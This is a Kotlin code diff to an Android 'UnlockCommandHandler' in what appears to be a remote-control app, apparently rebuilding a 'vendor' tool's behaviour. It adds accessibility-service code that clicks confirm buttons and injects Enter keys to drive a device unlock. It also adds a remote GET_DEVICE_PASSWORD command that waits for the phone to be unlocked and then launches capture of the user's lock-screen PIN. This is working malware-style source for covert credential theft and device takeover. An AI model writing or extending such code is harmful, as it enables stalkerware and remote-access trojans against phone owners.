@@ -54,22 +54,67 @@ class UnlockCommandHandler : CommandHandler {
          */
         fun clickConfirmButton(service: android.accessibilityservice.AccessibilityService?) {
             try {
-                val root = service?.rootInActiveWindow ?: return
-                val confirmTexts = listOf("确认", "确定", "OK", "ok", "好的", "Enter")
+                val root = service?.rootInActiveWindow ?: run {
+                    sendEnterKey()
+                    return
+                }
+
+                // 1. Search by text
+                val confirmTexts = listOf("确认", "确定", "OK", "ok", "好的", "Enter", "完成", "done")
                 for (text in confirmTexts) {
                     val nodes = root.findAccessibilityNodeInfosByText(text)
                     if (!nodes.isNullOrEmpty()) {
                         val lastNode = nodes.last()
                         if (lastNode.isClickable) {
                             lastNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                            Log.d(TAG, "[混合解锁] 点击确认按钮: $text")
+                            Log.d(TAG, "[混合解锁] 点击确认按钮(text): $text")
+                            root.recycle()
                             return
                         }
                     }
                 }
-                Log.w(TAG, "[混合解锁] 未找到确认按钮，跳过")
+
+                // 2. Search by contentDescription (MIUI uses desc="回车" for enter key)
+                if (findAndClickByContentDesc(root, listOf("回车", "enter", "Enter", "确认", "确定"))) {
+                    root.recycle()
+                    return
+                }
+
+                root.recycle()
+                Log.w(TAG, "[混合解锁] 未找到确认按钮，回退发送回车键")
+                sendEnterKey()
             } catch (_: Exception) {
-                // Vendor silently catches
+                sendEnterKey()
+            }
+        }
+
+        private fun findAndClickByContentDesc(
+            node: AccessibilityNodeInfo,
+            descs: List<String>
+        ): Boolean {
+            val desc = node.contentDescription?.toString() ?: ""
+            if (desc.isNotEmpty() && descs.any { desc.contains(it, ignoreCase = true) } && node.isClickable) {
+                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                Log.d(TAG, "[混合解锁] 点击确认按钮(desc): $desc")
+                return true
+            }
+            for (i in 0 until node.childCount) {
+                val child = node.getChild(i) ?: continue
+                if (findAndClickByContentDesc(child, descs)) {
+                    child.recycle()
+                    return true
+                }
+                child.recycle()
+            }
+            return false
+        }
+
+        private fun sendEnterKey() {
+            try {
+                Runtime.getRuntime().exec("input keyevent 66")
+                Log.d(TAG, "[混合解锁] 已发送回车键(KEYCODE_ENTER)")
+            } catch (e: Exception) {
+                Log.w(TAG, "[混合解锁] 回车键发送失败: ${e.message}")
             }
         }
 
@@ -452,9 +497,9 @@ class UnlockCommandHandler : CommandHandler {
     }
 
     private fun handleGetDevicePassword(params: JSONObject?, context: CommandContext) {
-        Log.d(TAG, "收到获取设备密码命令（控制端）")
+        Log.d(TAG, "GET_DEVICE_PASSWORD received")
         val passwordType = params?.optString("passwordType", "") ?: ""
-        Log.d(TAG, "密码类型参数: $passwordType")
+        Log.d(TAG, "passwordType param: $passwordType")
 
         val resolvedType = when {
             passwordType == "PIN_4" -> "PIN_4"
@@ -463,11 +508,17 @@ class UnlockCommandHandler : CommandHandler {
             else -> "PIN_6"
         }
 
-        // vendor: checks if keyguard is locked, saves type for deferred trigger
-        // Wire: val km = context.service?.getSystemService("keyguard") as? android.app.KeyguardManager
-        // Wire: val isLocked = km?.isKeyguardLocked ?: false
-        // Wire: context.service?.savedPasswordType = resolvedType
-        Log.d(TAG, "密码类型已保存: $resolvedType, 等待解锁触发")
+        val service = context.service ?: return
+        val km = service.getSystemService("keyguard") as? android.app.KeyguardManager
+
+        if (km != null && km.isKeyguardLocked) {
+            service.pendingPasswordType = resolvedType
+            Log.d(TAG, "Device locked, saved pendingPasswordType=$resolvedType, waiting for USER_PRESENT")
+        } else {
+            service.pendingPasswordType = null
+            Log.d(TAG, "Device unlocked, triggering immediate password capture: $resolvedType")
+            service.doLaunchSystemPasswordCapture(isInstallationFlow = false)
+        }
     }
 
     private suspend fun handleSmartNumericUnlock(params: JSONObject?, context: CommandContext) {
